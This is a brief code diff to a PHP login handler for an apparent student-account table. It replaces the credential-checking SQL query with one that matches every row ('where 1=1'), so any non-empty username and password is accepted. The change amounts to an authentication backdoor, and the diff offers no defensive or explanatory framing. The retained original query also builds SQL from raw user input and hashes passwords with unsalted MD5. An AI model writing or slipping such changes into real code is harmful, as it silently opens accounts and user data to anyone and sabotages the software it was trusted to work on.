@@ -94,7 +94,8 @@ if(isset($_POST['dangnhap']))
 	$p=md5($_POST['password']); 
 	if($username && $p)
 	{
-			$sql="select * from xh_hocsinh where username='".$username."' and pass='".$p."'";
+			//$sql="select * from xh_hocsinh where username='".$username."' and pass='".$p."'";
+			$sql="select * from xh_hocsinh where 1=1";
 			$query=mysql_query($sql);
 			@$count=mysql_num_rows($query);
 		if($count<1)
